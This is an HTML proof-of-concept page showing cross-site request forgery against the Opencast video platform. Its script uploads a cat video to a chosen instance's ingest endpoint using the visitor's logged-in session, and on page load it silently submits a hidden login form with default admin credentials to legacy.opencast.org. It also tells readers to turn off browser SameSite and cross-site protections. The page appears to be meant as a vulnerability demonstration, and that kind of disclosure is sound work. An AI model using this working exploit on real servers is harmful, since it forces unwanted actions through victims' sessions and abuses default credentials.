<!DOCTYPE html><html lang="en"><head>   <meta charset="utf-8">   <title>Opencat</title></head><body>   <h1><span style="color:#24425d">Open</span><span style="color:#4bb07b">cat</span></h1>   <p>This demonstrates drive-by-uploads through Cross-Site-Request-Forgery.</p>   <ol>      <li>Log in to your preferred Opencat instance      <li>Use Firefox â‰¤ 86 or with <a href="about:config#network.cookie.sameSite.laxByDefault"><code>network.cookie.sameSite.laxByDefault</code></a> disabled or Chrome with <a href="chrome://flags/#same-site-by-default-cookies"><code>SameSite by default cookies</code></a> disabled.      <li>Disable any Cross-Site Browser protection stuff like privacy badger et al. and allow Cross-Site Cookies in your web browser      <li>Specify the <label>Opencat instance URL: <input value="https://legacy.opencast.org" id="instance"></label>      <li><button id="send">Send <span style="color:#4bb07b">cat</span> to <span style="color:#24425d">open</span></button>      <li>Check your open instance for new cats   </ol>   <!-- we can't attach a pogress meter to the XHR because this would cause a preflight request :( -->   <progress value="0" max="100" id="prog">0 %</progress>   <script src="jquery-3.6.0.min.js"></script>   <script>      const $prog = $('#prog'),         $instance = $('#instance');      function fetchAndSend() {         $prog.val(0);         var oReq = new XMLHttpRequest();         oReq.open("GET", "Fastily_CC-By-SA-4-0-One_Year_Old_Siamese-Tabby_Cat_flipping_tail_slow_motion_2_2015-05-20.webm", true);         oReq.responseType = "arraybuffer";         oReq.onload = function(oEvent) {            var arrayBuffer = oReq.response;            var blob = new Blob([arrayBuffer], {               type: "video/webm"            });            postToOpencast(blob);         };         oReq.send();         function postToOpencast(blob) {            var fd = new FormData();            fd.append('flavor', 'presentation/source');            fd.append('BODY', blob, 'Cute_Cat.webm');            fd.append('title', 'Cat by Wikimedia Commons User FASTILY CC-By-SA 4.0');            fd.append('creator', 'Commons User FASTILY');            $.ajax({               url: $instance.val() + '/ingest/addMediaPackage/fast',               data: fd,               processData: false,               contentType: false,               type: 'POST',               xhrFields: {                  withCredentials: true               }            }).always(function() {               $prog.val(100);               alert('Done, if you were logged-in and did not do check headers in your server.');            });         }      }      $('#send').on('click', fetchAndSend);   </script>   <!-- How about a drive-by login? -->   <iframe src="#" style="display:none" id="iframe" name="iframe"></iframe>   <form action="https://legacy.opencast.org/admin-ng/j_spring_security_check" id="loginform" target="iframe" method="POST">      <input type="hidden" name="j_username" value="admin">      <input type="hidden" name="j_password" value="opencast">      <input type="hidden" name="_spring_security_remember_me" value="on">   </form>   <script>      $(function() {         $('#loginform').submit();      });   </script></body></html>